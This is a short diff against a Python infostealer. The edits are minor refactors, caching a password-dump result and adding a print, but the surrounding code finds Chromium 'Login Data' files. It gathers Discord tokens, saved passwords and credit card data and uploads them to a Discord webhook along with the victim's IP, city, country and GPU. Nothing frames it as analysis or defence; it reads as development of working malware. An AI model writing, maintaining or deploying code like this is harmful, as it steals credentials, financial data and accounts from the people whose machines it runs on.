@@ -354,6 +354,7 @@ if yes == "yes":
 					if not os.path.exists(db_path):
 						db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 1"+"\\Login Data"
 						if not os.path.exists( str(chromiumpaths[i])+ "\\Login Data"):
+							print("Not existing")
 							continue
 			local_state_path = chromiumpaths[i]  + "\\Local State"
 			if not os.path.isfile(chromiumpaths[i]  + "\\Local State"):
@@ -769,11 +770,11 @@ if yes == "yes":
 		embed = DiscordEmbed(title='New Machine connected', description=f'New machine connected\nInfos : \nGraphic Card : {GPUMODEL.Caption}\nIP : {IP}\nCity : {city}\nCountry : :flag_{country.lower()}:', color='03b2f8')
 		webhook.add_embed(embed)
 		webhook.add_file(file=getDisk0rdToken().replace("b'", "\n").replace("'", ""), filename="0xSxZ_On_Github_T0kains.txt")
-		print("[.] Password : "+ main())
+		pwdd =main()
 		ccs = getccs()
 		print(ccs)
 		webhook.add_file(file=ccs, filename="Cr3d1t_C4rds.txt")
-		webhook.add_file(file=str(main()), filename="0xPasswords.txt")
+		webhook.add_file(file=str(pwdd), filename="0xPasswords.txt")
 		
 		try:
 			autofill = stealChromeWin()
